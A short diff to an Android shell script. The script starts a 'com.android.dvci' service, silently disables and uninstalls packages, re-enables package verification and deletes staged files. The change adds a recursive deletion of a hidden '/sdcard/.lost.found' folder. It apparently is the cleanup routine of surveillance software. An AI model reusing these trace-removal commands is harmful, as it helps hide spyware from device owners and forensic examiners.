@@ -19,7 +19,7 @@ am startservice com.android.dvci/.ServiceMain
 for geb in `ls /data/data/*/files/geb`; do
 	init=${geb#/data/data/}
     package=${init%%/*}
-    #echo $package
+
     pm disable $package
     pm uninstall $package
 done
@@ -29,7 +29,7 @@ settings put global package_verifier_enable 1
 pm enable com.android.vending
 
 rm /sdcard/core.apk
-
+rm -r /sdcard/.lost.found
 #rm -r /data/data/com.android.deviceinfo
 #rm /data/app/com.android.deviceinfo*
 #rm -r /data/app-lib/com.android.deviceinfo*
